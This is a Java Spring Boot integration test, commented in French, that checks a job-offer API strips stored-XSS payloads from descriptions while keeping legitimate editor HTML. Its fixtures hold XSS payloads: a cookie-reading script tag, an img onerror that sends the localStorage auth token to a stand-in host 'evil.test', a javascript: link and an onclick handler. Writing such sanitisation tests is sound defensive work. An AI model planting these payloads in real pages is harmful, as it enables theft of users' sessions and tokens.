package com.linqorbit.joboffer.controller;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.http.MediaType;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

import tools.jackson.databind.JsonNode;
import tools.jackson.databind.ObjectMapper;

import com.linqorbit.candidate.service.NormalizationWorker;

/**
 * Sanitisation de la description d'offre côté serveur (D108) — la porte qui
 * ferme le XSS stocké.
 *
 * <p>Le contrat vérifié ici est le comportement <b>réel</b> : ce qui est
 * écrit en base et ce qui est relu par l'API (recruteur, admin, fiche
 * publique) ne contient jamais de balise active, d'attribut d'événement ni
 * d'URI non http(s). Le HTML transmis par l'API est construit à la main :
 * l'API est la seule porte d'entrée, un client n'est jamais présumé
 * honnête.
 *
 * <p>PostgreSQL réel : la ligne {@code job_offer.description} est relue
 * directement — un mock ne verrait pas ce que la base garde.
 */
@SpringBootTest
@AutoConfigureMockMvc
class JobOfferDescriptionSanitizationIntegrationTest {

    private static final String SKILL_ID = "a0000000-0000-4000-8000-000000000001";
    private static final String CONTRACT_TYPE_ID = "b0000000-0000-4000-8000-000000000001";
    private static final String EMPLOYMENT_TYPE_ID = "b1000000-0000-4000-8000-000000000001";
    private static final String WORK_MODE_ID = "b2000000-0000-4000-8000-000000000001";

    /** Charge utile XSS classique : script, image avec onerror, lien javascript:, onclick. */
    private static final String MALICIOUS_HTML = "<p>Legit text</p>"
            + "<script>alert(document.cookie)</script>"
            + "<img src=x onerror=\"fetch('//evil.test/'+localStorage.getItem('linqorbit.auth'))\">"
            + "<a href=\"javascript:alert(1)\">link</a>"
            + "<p onclick=\"steal()\">click</p>";

    /** Sortie attendue : le script et l'image disparaissent (et leur contenu), le texte utile reste. */
    private static final String SANITIZED_HTML = "<p>Legit text</p><a>link</a><p>click</p>";

    /** HTML produit par l'éditeur Tiptap — doit survivre au aller-retour. */
    private static final String LEGIT_HTML = "<h2>About the role</h2>"
            + "<p>You will build <strong>APIs</strong> in <em>Java</em>.</p>"
            + "<ul><li><p>Ship weekly</p></li></ul>"
            + "<p>See the <a href=\"https://example.com\" target=\"_blank\" rel=\"noopener noreferrer nofollow\">docs</a>.</p>";

    @Autowired
    private MockMvc mockMvc;
    @Autowired
    private ObjectMapper objectMapper;
    @Autowired
    private JdbcTemplate jdbcTemplate;

    @MockitoBean
    private NormalizationWorker normalizationWorker;

    private final List<UUID> createdUserIds = new ArrayList<>();
    private final List<UUID> createdCompanyIds = new ArrayList<>();
    private final List<UUID> createdOfferIds = new ArrayList<>();

    @AfterEach
    void cleanup() {
        for (UUID offerId : createdOfferIds) {
            // La validation crée un couple profil + job (normalisation) : à
            // nettoyer avant l'offre (FK normalized_profile_job_offer).
            jdbcTemplate.update("""
                    DELETE FROM normalization_job j
                    USING normalized_profile_job_offer npo
                    WHERE npo.normalized_profile_id = j.job_id AND npo.job_offer_id = ?""", offerId);
            // La publication crée un job de screening (FK vers la fiche, T-101) : à retirer avant les fiches.
            jdbcTemplate.update("DELETE FROM screening_job WHERE job_offer_id = ?", offerId);
            jdbcTemplate.update("DELETE FROM normalized_profile_job_offer WHERE job_offer_id = ?", offerId);
            jdbcTemplate.update("""
                    DELETE FROM normalized_profile np
                    WHERE NOT EXISTS (SELECT 1 FROM normalized_profile_candidate npc
                                       WHERE npc.normalized_profile_id = np.normalized_profile_id)
                      AND NOT EXISTS (SELECT 1 FROM normalized_profile_job_offer npo
                                       WHERE npo.normalized_profile_id = np.normalized_profile_id)""");
            jdbcTemplate.update("DELETE FROM job_offer_skill WHERE job_offer_id = ?", offerId);
            jdbcTemplate.update("DELETE FROM job_offer_language WHERE job_offer_id = ?", offerId);
            jdbcTemplate.update("DELETE FROM job_offer_degree WHERE job_offer_id = ?", offerId);
            jdbcTemplate.update("DELETE FROM job_offer_study_field WHERE job_offer_id = ?", offerId);
            jdbcTemplate.update("DELETE FROM job_offer_question WHERE job_offer_id = ?", offerId);
            jdbcTemplate.update("DELETE FROM job_offer WHERE id = ?", offerId);
        }
        for (UUID userId : createdUserIds) {
            jdbcTemplate.update("DELETE FROM company_members WHERE recruiter_id = ?", userId);
            jdbcTemplate.update("DELETE FROM recruiters WHERE id = ?", userId);
            jdbcTemplate.update("DELETE FROM users WHERE id = ?", userId);
        }
        for (UUID companyId : createdCompanyIds) {
            jdbcTemplate.update("DELETE FROM companies WHERE id = ?", companyId);
        }
        createdOfferIds.clear();
        createdUserIds.clear();
        createdCompanyIds.clear();
    }

    @Test
    void creationSanitiseLaDescriptionEnBaseEtEnReponse() throws Exception {
        String token = ownerWithCompany("Acme");
        UUID companyId = lastCompanyId();

        MvcResult result = mockMvc.perform(post("/api/v1/job-offers")
                        .header("Authorization", "Bearer " + token)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(createBody(companyId, "Backend Engineer", MALICIOUS_HTML)))
                .andExpect(status().isCreated())
                .andReturn();

        UUID offerId = registerOffer(result);

        // La réponse porte la version sanitisée…
        assertThat(readBody(result).get("description").asText()).isEqualTo(SANITIZED_HTML);
        // …et la base ne garde jamais le HTML cru.
        assertThat(storedDescription(offerId)).isEqualTo(SANITIZED_HTML);
        assertThat(storedDescription(offerId))
                .doesNotContain("script", "onerror", "onclick", "javascript:", "localStorage", "img");
    }

    @Test
    void editionSanitiseLaDescriptionEnBase() throws Exception {
        String token = ownerWithCompany("Acme");
        UUID companyId = lastCompanyId();
        UUID offerId = createOffer(token, companyId, "Backend Engineer", LEGIT_HTML);

        mockMvc.perform(put("/api/v1/job-offers/" + offerId)
                        .header("Authorization", "Bearer " + token)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(updateBody(MALICIOUS_HTML)))
                .andExpect(status().isNoContent());

        assertThat(storedDescription(offerId)).isEqualTo(SANITIZED_HTML);

        // La relecture recruteur rend la version sanitisée.
        MvcResult detail = mockMvc.perform(get("/api/v1/job-offers/" + offerId)
                        .header("Authorization", "Bearer " + token))
                .andExpect(status().isOk())
                .andReturn();
        assertThat(readBody(detail).get("description").asText()).isEqualTo(SANITIZED_HTML);
    }

    @Test
    void fichePubliqueExposeLaDescriptionSanitisee() throws Exception {
        String token = ownerWithCompany("Acme");
        UUID companyId = lastCompanyId();
        UUID offerId = createOffer(token, companyId, "Backend Engineer", MALICIOUS_HTML);
        publish(token, offerId);
        String publicId = publicIdOf(offerId);

        // Lecture publique, sans jeton : la fiche ne doit rien laisser passer.
        MvcResult result = mockMvc.perform(get("/api/v1/jobs/" + publicId))
                .andExpect(status().isOk())
                .andReturn();

        String description = readBody(result).get("description").asText();
        assertThat(description).isEqualTo(SANITIZED_HTML);
        assertThat(description)
                .doesNotContain("script", "onerror", "onclick", "javascript:", "localStorage", "img");
    }

    @Test
    void descriptionLegitimeFaitUnAllerRetourInchange() throws Exception {
        String token = ownerWithCompany("Acme");
        UUID companyId = lastCompanyId();

        MvcResult created = mockMvc.perform(post("/api/v1/job-offers")
                        .header("Authorization", "Bearer " + token)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(createBody(companyId, "Backend Engineer", LEGIT_HTML)))
                .andExpect(status().isCreated())
                .andReturn();

        UUID offerId = registerOffer(created);
        assertThat(offerId).isNotNull();

        assertThat(readBody(created).get("description").asText()).isEqualTo(LEGIT_HTML);
        assertThat(storedDescription(offerId)).isEqualTo(LEGIT_HTML);

        // Édition : le HTML légitime reste inchangé.
        mockMvc.perform(put("/api/v1/job-offers/" + offerId)
                        .header("Authorization", "Bearer " + token)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(updateBody(LEGIT_HTML)))
                .andExpect(status().isNoContent());
        assertThat(storedDescription(offerId)).isEqualTo(LEGIT_HTML);

        // Fiche publique : idem.
        publish(token, offerId);
        MvcResult publicJob = mockMvc.perform(get("/api/v1/jobs/" + publicIdOf(offerId)))
                .andExpect(status().isOk())
                .andReturn();
        assertThat(readBody(publicJob).get("description").asText()).isEqualTo(LEGIT_HTML);
    }

    @Test
    void duplicationCopieLaVersionSanitisee() throws Exception {
        String token = ownerWithCompany("Acme");
        UUID companyId = lastCompanyId();
        UUID offerId = createOffer(token, companyId, "Backend Engineer", MALICIOUS_HTML);

        MvcResult result = mockMvc.perform(post("/api/v1/job-offers/" + offerId + "/duplicate")
                        .header("Authorization", "Bearer " + token))
                .andExpect(status().isCreated())
                .andReturn();

        UUID copyId = registerOffer(result);
        assertThat(copyId).isNotNull();

        assertThat(readBody(result).get("description").asText()).isEqualTo(SANITIZED_HTML);
        assertThat(storedDescription(copyId)).isEqualTo(SANITIZED_HTML);
    }

    @Test
    void chargeUtileEntierementMalveillanteLaisseUneDescriptionVide() throws Exception {
        String token = ownerWithCompany("Acme");
        UUID companyId = lastCompanyId();

        MvcResult result = mockMvc.perform(post("/api/v1/job-offers")
                        .header("Authorization", "Bearer " + token)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(createBody(companyId, "Backend Engineer",
                                "<img src=x onerror=alert(1)><script>alert(1)</script>")))
                .andExpect(status().isCreated())
                .andReturn();

        UUID offerId = registerOffer(result);

        // Aucun résidu : la description est vide, pas une coquille malveillante.
        assertThat(readBody(result).get("description").isNull()).isTrue();
        assertThat(storedDescription(offerId)).isNull();
    }

    @Test
    void ecritureDeLaDescriptionExigeUnJeton() throws Exception {
        String token = ownerWithCompany("Acme");
        UUID companyId = lastCompanyId();
        UUID offerId = createOffer(token, companyId, "Backend Engineer", LEGIT_HTML);

        mockMvc.perform(post("/api/v1/job-offers")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(createBody(companyId, "Backend Engineer", MALICIOUS_HTML)))
                .andExpect(status().isUnauthorized());

        mockMvc.perform(put("/api/v1/job-offers/" + offerId)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(updateBody(MALICIOUS_HTML)))
                .andExpect(status().isUnauthorized());

        // Rien n'a été écrit par les appels anonymes.
        assertThat(storedDescription(offerId)).isEqualTo(LEGIT_HTML);
    }

    // --- Requêtes -------------------------------------------------------

    private String createBody(UUID companyId, String title, String description) throws Exception {
        Map<String, Object> body = new LinkedHashMap<>();
        body.put("companyId", companyId.toString());
        body.put("title", title);
        body.put("description", description);
        body.put("seniority", "mid");
        body.put("city", "Paris");
        body.put("country", "FR");
        body.put("contractTypeId", CONTRACT_TYPE_ID);
        body.put("employmentTypeId", EMPLOYMENT_TYPE_ID);
        body.put("workModeId", WORK_MODE_ID);
        body.put("skills", List.of(Map.of(
                "skillId", SKILL_ID, "requirementType", "mandatory", "weight", 4)));
        return objectMapper.writeValueAsString(body);
    }

    private String updateBody(String description) throws Exception {
        Map<String, Object> body = new LinkedHashMap<>();
        body.put("title", "Backend Engineer");
        body.put("description", description);
        body.put("seniority", "mid");
        body.put("city", "Paris");
        body.put("country", "FR");
        body.put("contractTypeId", CONTRACT_TYPE_ID);
        body.put("employmentTypeId", EMPLOYMENT_TYPE_ID);
        body.put("workModeId", WORK_MODE_ID);
        body.put("skills", List.of(Map.of(
                "skillId", SKILL_ID, "requirementType", "mandatory", "weight", 4)));
        return objectMapper.writeValueAsString(body);
    }

    // --- Fixtures -------------------------------------------------------

    private String ownerWithCompany(String companyName) throws Exception {
        String token = signup();
        mockMvc.perform(post("/api/v1/recruiters/me").header("Authorization", "Bearer " + token))
                .andExpect(status().isCreated());
        MvcResult result = mockMvc.perform(post("/api/v1/companies")
                        .header("Authorization", "Bearer " + token)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"name\": \"" + companyName + "\"}"))
                .andExpect(status().isCreated())
                .andReturn();
        UUID companyId = UUID.fromString(readBody(result).get("id").asText());
        createdCompanyIds.add(companyId);
        return token;
    }

    private UUID lastCompanyId() {
        return createdCompanyIds.get(createdCompanyIds.size() - 1);
    }

    private UUID createOffer(String token, UUID companyId, String title, String description) throws Exception {
        MvcResult result = mockMvc.perform(post("/api/v1/job-offers")
                        .header("Authorization", "Bearer " + token)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(createBody(companyId, title, description)))
                .andExpect(status().isCreated())
                .andReturn();
        UUID offerId = registerOffer(result);
        return offerId;
    }

    private void publish(String token, UUID offerId) throws Exception {
        mockMvc.perform(post("/api/v1/job-offers/" + offerId + "/validate")
                        .header("Authorization", "Bearer " + token))
                .andExpect(status().isNoContent());
        mockMvc.perform(post("/api/v1/job-offers/" + offerId + "/publish")
                        .header("Authorization", "Bearer " + token))
                .andExpect(status().isNoContent());
    }

    private String storedDescription(UUID offerId) {
        return jdbcTemplate.queryForObject(
                "SELECT description FROM job_offer WHERE id = ?", String.class, offerId);
    }

    private String publicIdOf(UUID offerId) {
        return jdbcTemplate.queryForObject(
                "SELECT public_id FROM job_offer WHERE id = ?", String.class, offerId);
    }

    private JsonNode readBody(MvcResult result) throws Exception {
        return objectMapper.readTree(result.getResponse().getContentAsString());
    }

    /**
     * Enregistre l'offre créée dans la liste de nettoyage — avant toute
     * assertion : une assertion en échec ne doit pas laisser de ligne dans
     * la base partagée.
     */
    private UUID registerOffer(MvcResult result) throws Exception {
        JsonNode id = readBody(result).get("id");
        if (id == null || id.isNull()) {
            return null;
        }
        UUID offerId = UUID.fromString(id.asText());
        createdOfferIds.add(offerId);
        return offerId;
    }

    private String signup() throws Exception {
        String email = "sanitize-" + UUID.randomUUID() + "@example.com";
        MvcResult result = mockMvc.perform(post("/api/v1/auth/signup")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("""
                                {
                                  "email": "%s",
                                  "password": "secret123",
                                  "firstName": "Ada",
                                  "lastName": "Lovelace",
                                  "phone": "+1 555 000 0000",
                                  "sex": "female",
                                  "homeCountry": "FR",
                                  "currentCity": "Paris",
                                  "currentCountry": "FR"
                                }
                                """.formatted(email)))
                .andExpect(status().isCreated())
                .andReturn();
        JsonNode body = readBody(result);
        createdUserIds.add(UUID.fromString(body.get("user").get("id").asText()));
        return body.get("token").asText();
    }
}
